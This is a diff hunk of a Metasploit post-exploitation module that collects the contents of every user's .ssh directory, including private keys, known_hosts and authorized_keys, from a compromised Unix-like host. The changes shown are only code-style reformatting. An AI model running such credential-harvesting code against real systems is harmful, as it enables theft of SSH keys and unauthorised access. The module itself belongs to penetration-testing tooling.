@@ -9,24 +9,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather OpenSSH PKI Credentials Collection',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather OpenSSH PKI Credentials Collection',
+        'Description' => %q{
           This module will collect the contents of all users' .ssh directories on the targeted
-        machine. Additionally, known_hosts and authorized_keys and any other files are also
-        downloaded. This module is largely based on firefox_creds.rb.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Jim Halfpenny'],
-      'Platform'       => %w{ bsd linux osx unix },
-      'SessionTypes'   => ['meterpreter', 'shell' ]
-    ))
+          machine. Additionally, known_hosts and authorized_keys and any other files are also
+          downloaded. This module is largely based on firefox_creds.rb.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Jim Halfpenny'],
+        'Platform' => %w{bsd linux osx unix},
+        'SessionTypes' => ['meterpreter', 'shell' ]
+      )
+    )
   end
 
   def run
     print_status("Finding .ssh directories")
-    paths = enum_user_directories.map {|d| d + "/.ssh"}
+    paths = enum_user_directories.map { |d| d + "/.ssh" }
     # Array#select! is only in 1.9
     paths = paths.select { |d| directory?(d) }
 
@@ -97,9 +100,7 @@ class MetasploitModule < Msf::Post
             print_error("Could not load SSH Key: #{e.message}")
           end
         end
-
       end
-
     end
   end
 end
